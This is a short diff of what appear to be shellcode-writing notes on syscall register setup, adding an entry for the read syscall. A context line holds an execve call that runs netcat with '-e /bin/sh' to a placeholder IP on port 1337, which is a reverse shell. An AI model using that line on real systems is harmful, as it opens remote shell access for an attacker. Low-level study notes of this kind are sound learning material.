@@ -80,3 +80,12 @@ execve          ("/bin/nc",{"/bin/nc","<ip>","1337","-e","/bin/sh"},NULL)
 fgets register setup
 rax = ptr to file descriptor; 01 for stdin
 rdi = stack ptr where string will be stored
+
+###################################################################
+
+read  
+
+rdi = stdin file descriptor
+rsi = buffer
+rdx = buffer_size
+eax = read syscall 0
